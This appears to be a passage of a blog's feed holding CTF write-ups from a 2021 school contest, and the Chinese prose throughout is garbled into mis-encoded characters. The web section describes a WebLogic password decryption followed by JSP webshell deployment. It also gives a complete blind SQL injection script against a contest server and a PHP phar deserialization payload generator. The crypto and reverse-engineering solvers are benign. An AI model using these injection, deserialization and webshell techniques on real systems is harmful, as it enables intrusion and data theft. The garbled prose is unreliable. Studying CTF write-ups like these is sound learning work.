class="keyword">from</span><span class="comment">/**/</span>flagisHere.flAg</span><br></pre></td></tr></table></figure><h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p>æŒ‰ç…§wpçš„åå¼¹shellæ²¡æ‰“é€š</p><h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><p>è¿™ä¸ªé¢˜å­¦åˆ°çš„æŒºå¤šçš„</p><p>å…ˆé€šè¿‡ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´è·å¾—å¯†é’¥å’Œå¯†æ–‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;config&#x2F;config.xml</span><br><span class="line">.&#x2F;security&#x2F;SerializedSystemIni.dat</span><br></pre></td></tr></table></figure><p>ç„¶åç”¨è¿™ä¸ª<a href="https://github.com/TideSec/Decrypt_Weblogic_Password">https://github.com/TideSec/Decrypt_Weblogic_Password</a>æ–‡ç« ä¸­æåˆ°çš„ï¼Œè·å¾—å¯†ç ï¼Œç™»å…¥åå°ï¼Œéƒ¨ç½²æœ¨é©¬ã€‚</p><p>waræœ¨é©¬ï¼Œå°±æ˜¯å°†jspæœ¨é©¬å‹ç¼©æˆzipï¼Œç„¶åæ”¹åç¼€å°±è¡Œï¼Œè¿™é‡ŒæŠŠwaréƒ¨ç½²åˆ°æœåŠ¡å™¨ä¸Šã€‚</p><p>è®¿é—®å¤§é©¬æ–‡ä»¶<a href="http://host/test/JspSpy.jsp">http://host/test/JspSpy.jsp</a></p><p>æ‰¾åˆ°ä¸ªflag.tarï¼Œç»“æœæˆ‘è§£å‹çš„æ—¶å€™ç»™ç ´åäº†ï¼Œç°åœ¨æœåŠ¡å™¨é‡Œæ²¡flagäº†ï¼Œå®ƒè¿™ä¸ªæ˜¯æ‰€æœ‰äººä¸€ä¸ªç¯å¢ƒï¼Œåé¢å¤ç°çš„äººå¾—å¤šå°‘æœ‰ç‚¹æ‡µé€¼ï¼Œæ‰€ä»¥ï¼š</p><p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20211013215350.png"></p><p>æˆ‘åœ¨æ ¹ç›®å½•é‡Œé¢åˆ›å»ºäº†ä¸ªå‡çš„flagï¼ˆå“ˆå“ˆå“ˆï¼Œé€ƒ</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h2&gt;&lt;h3 id=&quot;sql2&quot;&gt;&lt;a href=&quot;#sql2&quot; class=&quot;headerlink&quot; title=&quot;sql2&quot;&gt;&lt;/a&gt;sql</summary>
      
    
    
    
    <category term="ctfå­¦ä¹ " scheme="http://haorical.xyz/categories/ctf%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="ctf" scheme="http://haorical.xyz/tags/ctf/"/>
    
    <category term="web" scheme="http://haorical.xyz/tags/web/"/>
    
    <category term="sqlæ³¨å…¥" scheme="http://haorical.xyz/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>2021ç§‹å­£èµ›éƒ¨åˆ†wp</title>
    <link href="http://haorical.xyz/posts/31200392/"/>
    <id>http://haorical.xyz/posts/31200392/</id>
    <published>2021-10-11T15:41:41.000Z</published>
    <updated>2021-10-11T15:56:40.461Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>éœ‡æƒŠï¼å¹³å¹³æ— å¥‡çš„webæ‰‹ï¼Œç«Ÿç„¶æŠŠcrypto akäº†ï¼Œé¡ºå¸¦åšäº†2ä¸ªreå’Œå‡ ä¸ªmiscã€‚ã€‚ã€‚</p><p>æ ¡èµ›æ„Ÿè§‰éš¾åº¦ä¸€èˆ¬ï¼Œå°±æ˜¯ç»™å…¥é—¨çš„åšäº†ï¼Œæš‘å‡å­¦çš„å¥½å¤šéƒ½ç”¨ä¸Šäº†ï¼Œæ„Ÿè§‰ä¸é”™ã€‚ä¸è¿‡æŒç»­æ—¶é—´å¤ªé•¿äº†ï¼Œç›´æ¥7å¤©ï¼Œè€Œä¸”å›½åº†é‚£å‡ å¤©è´¼å¿™ï¼Œéƒ¨é—¨ã€å·¥ä½œå®¤ã€æ–°ç”ŸÂ·Â·Â·Â·Â·Â·æ—¶é—´ä¸æ˜¯å¾ˆåˆç†ï¼Œæœ€åå‡ å¤©ç›´æ¥æ‘†çƒ‚äº†ï¼Œä¸€ä¸ªé¢˜ä¹Ÿæ²¡åšã€‚</p><span id="more"></span><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><blockquote><p>æ— åˆ—åæ³¨å…¥ï¼Œå’Œå¯’å‡èµ›çš„ç±»ä¼¼</p></blockquote><p>åº“åè¿˜æ˜¯cumtctf</p><p>çˆ†è¡¨åå¾—åˆ°flag_table_1</p><p>æ— åˆ—åæ³¨å…¥å¾—åˆ°flagï¼Œéœ€è¦å˜æˆå°å†™</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://81.69.241.44:25500/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">s = <span class="string">&quot;-&#123;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789,_!@#$%^&amp;*()&#125;&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">for i in range(1,1000):</span></span><br><span class="line"><span class="string">    for j in s:</span></span><br><span class="line"><span class="string">        time.sleep(0.1)</span></span><br><span class="line"><span class="string">        payload = &quot;1&#x27;/**/||/**/!(ascii(mid((select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/!(database_name&lt;&gt;&#x27;cumtctf&#x27;)),&#123;&#125;,1))&lt;&gt;ascii(&#x27;&#123;&#125;&#x27;))#&quot;.format(i, j)</span></span><br><span class="line"><span class="string">        data = &#123;</span></span><br><span class="line"><span class="string">            &#x27;username&#x27;: payload,</span></span><br><span class="line"><span class="string">            &#x27;password&#x27;: &#x27;1&#x27;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        res = requests.post(url=url, headers=headers, data=data).text</span></span><br><span class="line"><span class="string">        if res.find(&#x27;good&#x27;) != -1:</span></span><br><span class="line"><span class="string">            table += j</span></span><br><span class="line"><span class="string">            print(table)</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">payload2 = &quot;1&#x27;/**/||/**/!(mid((select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/!(database_name&lt;&gt;&#x27;cumtctf&#x27;)),1,34)&lt;&gt;&#x27;address,email,flag_table_1,users&#x27;)#;&quot;</span></span><br><span class="line"><span class="string">data = &#123;</span></span><br><span class="line"><span class="string">    &#x27;username&#x27;: payload2,</span></span><br><span class="line"><span class="string">    &#x27;password&#x27;: &#x27;1&#x27;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">res = requests.post(url=url, headers=headers, data=data).text</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">payload3 = &quot;1&#x27;/**/||/**/(1,1)&gt;(select/**/*/**/from/**/flag_table_1/**/limit/**/0,1)#;&quot;</span></span><br><span class="line"><span class="string">data = &#123;</span></span><br><span class="line"><span class="string">    &#x27;username&#x27;: payload3,</span></span><br><span class="line"><span class="string">    &#x27;password&#x27;: &#x27;1&#x27;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">res = requests.post(url=url, headers=headers, data=data).text</span></span><br><span class="line"><span class="string">print(res)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trans</span>(<span class="params">flag</span>):</span></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">        res += <span class="built_in">hex</span>(<span class="built_in">ord</span>(i))</span><br><span class="line">    res = <span class="string">&#x27;0x&#x27;</span> + res.replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">500</span>): </span><br><span class="line">    time.sleep(<span class="number">0.01</span>)</span><br><span class="line">    hexchar = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">126</span>):</span><br><span class="line">    <span class="comment"># for j in s:</span></span><br><span class="line">        hexchar = trans(flag+ <span class="built_in">chr</span>(char))</span><br><span class="line">        payload = <span class="string">&quot;0&#x27;||/**/if((select/**/(0,&#123;&#125;)&gt;(select/**/*/**/from/**/flag_table_1/**/limit/**/0,1)),1,0)#&quot;</span>.<span class="built_in">format</span>(hexchar)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url=url, data=data).text</span><br><span class="line">        <span class="keyword">if</span> r.find(<span class="string">&#x27;good&#x27;</span>) != -<span class="number">1</span>:</span><br><span class="line">            flag += <span class="built_in">chr</span>(char-<span class="number">1</span>)</span><br><span class="line">            <span class="comment"># flag += j</span></span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><blockquote><p>pharååºåˆ—åŒ–</p></blockquote><p>å…ˆé€šè¿‡ä»»æ„æ–‡ä»¶è¯»å–è·å¾—class file fun classè¿™äº›phpæ–‡ä»¶ï¼Œä»£ç å®¡è®¡</p><p>æ„é€ popé“¾ï¼Œç”Ÿæˆpharæ–‡ä»¶</p><p>çœ‹åˆ°å·²ç»æœ‰å…¶ä»–é˜Ÿä¼æŠŠè¿™é¢˜åšå‡ºæ¥äº†ï¼Œæ­¤æ—¶å…ˆæµ‹è¯•çœ‹çœ‹èƒ½ä¸èƒ½è¿ä¸Šåˆ«çš„é˜Ÿä¼ä¸Šä¼ æˆåŠŸçš„æ–‡ä»¶ï¼Œæ ¹æ®file.phpä¸­å¯¹æ–‡ä»¶åçš„å¤„ç†ï¼Œéšä¾¿æµ‹è¯•äº†å‡ ä¸ªï¼Œå‘ç°phar.jpgå¤„ç†åçš„æ–‡ä»¶è·¯å¾„èƒ½ç”¨ï¼Œè·å¾—flag</p><p>ä¸‹é¢è´´ä¸Šè‡ªå·±å†™çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fakefile</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Docker</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$container1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$container2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cloud</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$docker</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;value = <span class="string">&quot;/var/www/html/flag.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$File</span> = <span class="keyword">new</span> File();</span><br><span class="line"><span class="variable">$docker</span> = <span class="keyword">new</span> Docker();</span><br><span class="line"><span class="variable">$cloud</span> = <span class="keyword">new</span> Cloud();</span><br><span class="line"></span><br><span class="line"><span class="variable">$cloud</span>-&gt;docker = <span class="string">&#x27;O\:6\:\&quot;Docker\&quot;\:3\:\&#123;s\:3\:\&quot;str\&quot;\;s\:4\:\&quot;haha\&quot;\;s\:10\:\&quot;container1\&quot;\;s\:4\:\&quot;haha\&quot;\;s\:10\:\&quot;container2\&quot;\;s\:4\:\&quot;haha\&quot;\;\&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$File</span>-&gt;file = <span class="variable">$docker</span>;</span><br><span class="line"><span class="variable">$docker</span>-&gt;str = <span class="variable">$cloud</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$File</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h3><p>ç›´æ¥æ‹–åˆ°idaé‡Œï¼Œå¾—åˆ°flag</p><p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/QQ%E6%88%AA%E5%9B%BE20211003125756.png"></p><h3 id="net"><a href="#net" class="headerlink" title="net"></a>net</h3><p>æ‹–åˆ°ILSpyé‡Œï¼Œè·å¾—é€†å‘ä»£ç </p><p>ç®€å•å†™ä¸ªè„šæœ¬</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ppp</span>(<span class="params">a, b, c</span>):</span></span><br><span class="line">    num = <span class="number">1</span></span><br><span class="line">    a %= c</span><br><span class="line">    <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> b % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            num = num * a % c</span><br><span class="line">        b &gt;&gt;= <span class="number">1</span></span><br><span class="line">        a = a * a % c      </span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line">array2 = [</span><br><span class="line">            <span class="number">30361</span>,</span><br><span class="line"><span class="number">550</span>,</span><br><span class="line"><span class="number">595</span>,</span><br><span class="line"><span class="number">15412</span>,</span><br><span class="line"><span class="number">30361</span>,</span><br><span class="line"><span class="number">15412</span>,</span><br><span class="line"><span class="number">8346</span>,</span><br><span class="line"><span class="number">27071</span>,</span><br><span class="line"><span class="number">37594</span>,</span><br><span class="line"><span class="number">37534</span>,</span><br><span class="line"><span class="number">9781</span>,</span><br><span class="line"><span class="number">1082</span>,</span><br><span class="line"><span class="number">19619</span>,</span><br><span class="line"><span class="number">9781</span>,</span><br><span class="line"><span class="number">1082</span>,</span><br><span class="line"><span class="number">15513</span>,</span><br><span class="line"><span class="number">29591</span>,</span><br><span class="line"><span class="number">19596</span>,</span><br><span class="line"><span class="number">30078</span>,</span><br><span class="line"><span class="number">27942</span>,</span><br><span class="line"><span class="number">25366</span>,</span><br><span class="line"><span class="number">29107</span>,</span><br><span class="line"><span class="number">7433</span>,</span><br><span class="line"><span class="number">28493</span>,</span><br><span class="line"><span class="number">9781</span>,</span><br><span class="line"><span class="number">29591</span>,</span><br><span class="line"><span class="number">2664</span>,</span><br><span class="line"><span class="number">12540</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">test = []</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(array2)):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">100000</span>):</span><br><span class="line">        <span class="keyword">if</span> array2[j] == ppp(i, <span class="number">377</span>, <span class="number">38009</span>):</span><br><span class="line">            test.append(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> test:</span><br><span class="line">        print(<span class="built_in">chr</span>(j-i), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>è·‘å‡ºflag</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="ç­¾åˆ°-1"><a href="#ç­¾åˆ°-1" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h3><p>ç®€å•å†™ä¸ªè„šæœ¬çˆ†ç ´</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">table=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">a = <span class="number">37</span></span><br><span class="line">b = <span class="number">23</span></span><br><span class="line">c = <span class="number">52</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">def affine(m,a,b,c):</span></span><br><span class="line"><span class="string">    chipher=&#x27;&#x27;</span></span><br><span class="line"><span class="string">    for i in range(len(m)):</span></span><br><span class="line"><span class="string">        if m[i] in table:</span></span><br><span class="line"><span class="string">            chipher+=table[(a*(table.find(m[i]))+b)%c]</span></span><br><span class="line"><span class="string">        else:</span></span><br><span class="line"><span class="string">            chipher+=m[i]</span></span><br><span class="line"><span class="string">    return chipher</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">t = <span class="string">&#x27;aoxL&#123;Fw0_TXk_y3xtW_ZP_TCBg7VLCxGwb&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(t)):</span><br><span class="line">    <span class="keyword">if</span> t[i] <span class="keyword">in</span> table:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> table:</span><br><span class="line">            <span class="keyword">if</span> table[(a*(table.find(j))+b)%c] == t[i]:</span><br><span class="line">                flag += j</span><br><span class="line">                print(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += t[i]</span><br><span class="line">        print(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="lcg"><a href="#lcg" class="headerlink" title="lcg"></a>lcg</h3><p>ä»ç½‘ä¸Šæ‰¾ä¸ªä¸ªè„šæœ¬ï¼Œå†™çš„å¾ˆè¯¦ç»†</p><p><a href="https://blog.csdn.net/superprintf/article/details/108964563">https://blog.csdn.net/superprintf/article/details/108964563</a></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">flag = &#x27;&#x27;.encode()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">seed = bytes_to_long(flag)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(seed)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">length = seed.bit_length()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(length)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">n=getPrime(length)</span></span><br><span class="line"><span class="string">a=getPrime(length)</span></span><br><span class="line"><span class="string">b=getPrime(length)</span></span><br><span class="line"><span class="string">s=[]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for i in range(10):</span></span><br><span class="line"><span class="string">    seed = (a*seed+b)%n</span></span><br><span class="line"><span class="string">    s.append(seed)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(s)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">a,b</span>):</span> </span><br><span class="line">    <span class="keyword">if</span>(b==<span class="number">0</span>): </span><br><span class="line">        <span class="keyword">return</span> a </span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        <span class="keyword">return</span> gcd(b,a%b) </span><br><span class="line">s=[<span class="number">64053834035066785058511795263859088093402576718387054930069870694827422995248363210875296865931156540418540088656840163752864867889701529</span>, <span class="number">62747878069691338351001678737533032651009187924993079609551517187402239263500990458468121965725468864035542647616568888614971291913860683</span>, <span class="number">8610389166165547798963079074461089122942923569827711232062490735297527674581120584017030806864406444034839689358368567214353599295961192</span>, <span class="number">67368398051089407366868405625671942347378755129423872678285919732014302509367453094142041707571135936337763803644340301362544880144675515</span>, <span class="number">3140546334522640626644397935274312967014650101920766829848908314358452633165879115222769049730993718556007257838431843662986174886332684</span>, <span class="number">86570894867827558107244361752089586436766881136739525172025909326268148819720261812567282066327259810017581923500053674785415315313293458</span>, <span class="number">74270633946662538117925791534180331044438757906314082041974053142483165604719102121031974214138125154407150853174565679126633465007917723</span>, <span class="number">82222345180880564316408536364709779418528442531150999715627704885024880160675971236916036110841803202987616501846568355385621016171784903</span>, <span class="number">79833541796675422937999973936505826001046326324194169378072775519666431460490483847928549009565561011528302879850550395115321828798479473</span>, <span class="number">70276250399219459795079058514491950109021040664671993784167534811426903455184545174600178849521746939676479421177456528336980088529680364</span>]</span><br><span class="line">t = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    t.append(s[i]-s[i-<span class="number">1</span>]) </span><br><span class="line">all_n = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    all_n.append(gcd((t[i+<span class="number">1</span>]*t[i-<span class="number">1</span>]-t[i]*t[i]), (t[i+<span class="number">2</span>]*t[i]-t[i+<span class="number">1</span>]*t[i+<span class="number">1</span>]))) </span><br><span class="line"></span><br><span class="line">MMI = <span class="keyword">lambda</span> A, n,s=<span class="number">1</span>,t=<span class="number">0</span>,N=<span class="number">0</span>: (n &lt; <span 